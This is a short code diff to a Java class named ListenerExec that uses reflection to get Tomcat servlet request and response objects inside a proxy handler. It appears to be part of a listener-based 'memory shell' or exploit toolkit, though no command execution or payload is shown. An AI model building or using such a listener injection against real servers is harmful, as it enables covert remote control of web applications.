@@ -30,17 +30,18 @@ public class ListenerExec implements InvocationHandler {
         return null;
     }
 
-//    private void run(Object sre) {
-//    }
-
     /**
      * tomcat
      */
-//    public Object getResponse(Object httpServletRequest) throws Exception{
-//        Object request = getFieldValue(httpServletRequest, "request");
+//    public Object getResponse(Object request) throws Exception {
+//        try {
+//            request = getFieldValue(request, "request");
+//        }catch (Exception e){
+//        }
 //        Object httpServletResponse = getFieldValue(request, "response");
 //        return httpServletResponse;
 //    }
+
     private void run(Object sre) {
         try {
             Object httpServletRequest = invokeMethod(sre, "getServletRequest", new Class[]{}, new Object[]{});
